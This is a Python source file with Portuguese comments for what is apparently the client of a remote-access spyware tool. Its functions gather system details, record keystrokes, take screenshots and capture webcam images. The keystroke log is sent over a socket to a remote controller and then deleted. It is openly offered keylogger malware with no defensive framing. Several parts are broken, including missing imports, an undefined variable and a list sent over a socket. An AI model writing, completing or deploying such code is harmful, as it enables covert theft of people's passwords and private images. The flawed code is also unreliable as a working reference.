import socket, platform, os
import keyboard
import pygame

# ========= FUNCOES DE DESCOBERTA =========

def detalhes_da_maquina(cliente):
    mensagem = "\nSistema: {}\nNó: {}\nRelease: {}\nVersão: {}\nBits do processador: {}".format(platform.system(),
    platform.node(),platform.release(),platform.version(),platform.processor())
    cliente.send(mensagem.encode())

def detalhes_do_python(cliente):
    mensagem = "\nVersao: {}\n Versao Tuple: {} \nCompilador: {} Build: {}".format(platform.python_version(),
    platform.python_version_tuple(),
    platform.python_compiler(),
    platform.python_build())
    cliente.send(mensagem.encode())

# ========= FUNCOES DO KEYLOGGER =========

def keylogger(cliente):
    arquivo = open('log.txt','w')
    arquivo.close()
    recorded = keyboard.record(until='esc')
    for i in range(0,len(recorded)):
        v1 = str(recorded[i])
        v2 = v1.strip('KeyboardEvent')
        v3 = v2.strip('()')
        v4 = v3.split()
        if(v4[1] == 'down'):
            if(v4[0] == 'backspace'):
                salvar = ' backspace '
            elif(v4[0] == 'space'):
                salvar = ' '
            elif(v4[0] == 'enter'):
                salvar = '\n'
            else:
                salvar = v4[0]
            arquivo = open('log.txt','a')
            arquivo.write(salvar)
    arquivo.close()
    enviar_arquivo(cliente,'log.txt')
    os.remove('log.txt')

def screenshot(cliente):
    fig = pyautogui.screenshot(r)
    fig.save(r'fig.png')

def webcam():
    pygame.init()
    pygame.camera.init()
    webcam = pygame.camera.Camera("/dev/video0", (800,600))
    i = 0
    while i < 15:
        webcam.start()
        imagem = webcam.get_image()
        webcam.stop()
        save = time.strftime("%d-%m-%Y_%H%M%S", time.localtime())
        file = "registros/{}.jpg".format(save)
        pygame.image.save(imagem, file)
        i += 1

def enviar_arquivo(cliente,dir):
    arquivo = open(dir,"r")
    data = arquivo.readlines()
    cliente.send(data)
    arquivo.close()

def comando_nao_reconhecido(cliente):
    mensagem = "\nComando nao reconhecido no sistema, tente novamente"
    cliente.send(mensagem.encode())
